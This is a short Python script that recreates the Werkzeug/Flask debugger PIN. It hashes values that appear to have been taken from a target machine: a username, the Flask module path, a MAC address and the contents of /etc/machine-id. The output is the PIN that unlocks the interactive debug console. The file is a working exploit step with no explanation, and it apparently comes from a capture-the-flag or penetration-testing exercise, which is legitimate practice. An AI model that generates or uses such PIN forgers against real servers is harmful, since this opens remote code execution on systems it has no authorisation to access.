import hashlib
from itertools import chain

probably_public_bits = [
    'htmlfetcher',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/home/htmlfetcher/.local/lib/python3.6/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '2485378023426',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    '96cec10d3d9307792745ec3b85c896207c248d90037505adc07822804fc5b2289664e4be47666dfd829d8713da6ba1bf'  # get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = f"__wzd{h.hexdigest()[:20]}"

num = None
if num is None:
    h.update(b'pinsalt')
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
